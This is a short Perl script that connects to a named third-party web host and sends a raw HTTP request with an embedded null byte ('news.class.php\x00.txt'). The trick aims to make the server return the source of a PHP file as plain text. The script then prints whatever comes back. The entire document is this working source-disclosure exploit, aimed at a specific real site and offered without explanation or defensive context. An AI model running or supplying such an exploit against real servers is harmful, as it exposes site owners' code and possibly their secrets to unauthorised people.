use IO::Socket;
 
$sock = IO::Socket::INET->new(PeerAddr => 'rapidshare.zoozle.net',
                              PeerPort => '80',
                              Proto    => 'tcp');
 
print $sock "GET /php/news.class.php\x00.txt HTTP/1.1\r\nHost: rapidshare.zoozle.net\r\n\r\n";
 
while(<$sock>) {
 print; 
}
